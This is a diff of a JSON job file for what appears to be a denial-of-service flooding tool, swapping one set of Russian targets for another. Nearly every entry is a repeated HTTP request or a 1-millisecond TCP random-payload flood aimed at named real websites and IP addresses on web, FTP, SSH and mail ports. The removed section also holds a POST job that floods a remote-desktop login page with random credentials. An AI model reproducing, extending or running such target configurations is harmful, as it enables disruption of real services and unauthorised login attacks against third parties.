@@ -1,243 +1,317 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://ac.atol.ru"
+          "path": "http://youla.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:80",
+            "addr": "217.69.139.20:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://ac.atol.ru"
+          "path": "https://youla.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:443",
+            "addr": "217.69.139.20:443",
             "is_tls": "true"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "185.10.63.173:21",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "185.10.63.173:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "185.10.63.173:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://lk.atol.ru/#/auth/login"
+          "path": "http://www.doski.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:80",
+            "addr": "185.10.63.173:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "185.10.63.173:110",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 32,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.doski.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.10.63.173:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "152.89.217.251:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 32,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.unibo.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "152.89.217.251:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://lk.atol.ru/#/auth/login"
+          "path": "https://www.unibo.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:443",
+            "addr": "152.89.217.251:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://uc.atol.ru/login/index.php"
+          "path": "http://www.farpost.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:80",
+            "addr": "80.92.164.139:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://uc.atol.ru/login/index.php"
+          "path": "https://www.farpost.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:443",
+            "addr": "80.92.164.139:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://term.atol.ru/RDWeb/webclient/index.html"
+          "path": "http://www.farpost.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:80",
+            "addr": "80.92.164.136:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://term.atol.ru/RDWeb/webclient/index.html"
+          "path": "https://www.farpost.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:443",
+            "addr": "80.92.164.136:443",
             "is_tls": "true"
           }
         }
       }
     }, {
-      "type": "http",
-      "count": 53,
+      "type": "tcp",
+      "count": 32,
       "args": {
-        "request": {
-          "method": "POST",
-          "path": "https://term.atol.ru/RDWeb/Pages/en-US/login.aspx",
-          "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Referer": "https://term.atol.ru/RDWeb/webclient/index.html",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://term.atol.ru",
-            "Connection": "keep-alive",
-            "Cookie": "TSWAFeatureCheckCookie=true; __lhash_=e37683575f17073e9af54448186161e4; MSFPC=GUID=f7ed8f67c918422b9917892e140eb1a5&HASH=f7ed&LV=202204&V=4&LU=1649184658688",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
-            "TE": "trailers"
-          },
-          "body": "DomainUserName=y{{random_int}}&UserPass={{random_payload_byte (random_int_n 10) | base64_encode}}"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.71.67.137:443",
-            "is_tls": true
-          }
-        }
+        "address": "178.21.14.238:21",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "178.21.14.238:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "178.21.14.238:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.atol.ru"
+          "path": "http://kupiprodai.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:80",
+            "addr": "178.21.14.238:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.atol.ru"
+          "path": "https://kupiprodai.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.71.67.137:443",
+            "addr": "178.21.14.238:443",
             "is_tls": "true"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "37.46.133.81:21",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "37.46.133.81:22",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "37.46.133.81:25",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://online.atol.ru"
+          "path": "http://rudos.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.31.134.104:80",
+            "addr": "37.46.133.81:80",
             "is_tls": "false"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 32,
+      "args": {
+        "address": "37.46.133.81:110",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 53,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://online.atol.ru"
+          "path": "https://rudos.ru"
         },
         "client": {
           "static_host": {
-            "addr": "185.31.134.104:443",
+            "addr": "37.46.133.81:443",
             "is_tls": "true"
           }
         }
       }
     }, {
-      "type": "http",
-      "count": 53,
+      "type": "tcp",
+      "count": 32,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://online.atol.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.31.134.103:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 53,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://online.atol.ru"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.31.134.103:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "37.46.133.81:465",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }
   ]
